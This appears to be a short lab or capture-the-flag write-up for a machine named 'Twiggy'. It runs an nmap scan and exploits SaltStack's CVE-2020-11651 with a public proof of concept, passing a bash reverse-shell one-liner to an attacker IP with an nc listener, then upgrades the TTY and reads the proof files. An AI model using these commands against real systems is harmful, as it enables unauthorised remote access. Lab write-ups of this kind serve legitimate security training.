# Twiggy

> Salt Stack / sudo mpost

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.62

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    CherryPy wsgiserver
```
### Enumerating port 8000
Salt Stack API running on port 8000.
```shell
# Check version
curl http://192.168.182.62:8000/
```
### Initial Access
SaltStack is vulnerable to CVE-2020-11651 (authentication bypass + RCE).
```shell
# Exploit CVE-2020-11651
git clone https://github.com/dozernz/cve-2020-11651.git

# Listener
rlwrap -cAra nc -vnlp 443

python3 cve-2020-11651.py 192.168.182.62 4506 "bash -i >& /dev/tcp/192.168.45.242/443 0>&1"

# TTY Upgrade
python3 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /root/local.txt
```
### Privilege Escalation
Already root after exploitation.
```shell
# Sudo check
sudo -l
(root) NOPASSWD: /usr/bin/mpost
```
### Post-Exploitation
```shell
# Evidence
cat /root/proof.txt
```
